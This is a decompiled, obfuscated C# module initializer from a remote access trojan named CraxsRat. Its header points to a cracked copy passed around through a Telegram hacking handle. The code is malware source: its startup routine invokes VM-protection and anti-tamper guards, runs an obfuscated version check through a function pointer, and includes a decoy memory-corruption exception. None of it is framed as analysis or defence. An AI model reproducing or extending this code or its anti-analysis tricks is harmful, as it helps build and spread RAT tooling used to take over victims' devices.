// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat;
using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

#nullable disable
internal class \u003CModule\u003E
{
  public static string \u0033545513C;

  static \u003CModule\u003E()
  {
    Win_Users.VaultVM\u002DProtect\u002D8F2EEGH61H();
    // ISSUE: method pointer
    // ISSUE: cast to a function pointer type
    // ISSUE: function pointer call
    \u00357154D07.\u00352022C07(__calli((__FnPtr<Version ()>) __methodptr(get_Version))());
    EXGuarder.Startup();
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static void \u0031C67451A()
  {
    throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
  }

  [DllImport("kernel32.dll", EntryPoint = "CloseHandle")]
  private static extern bool \u003722F1A3D([In] IntPtr obj0);
}
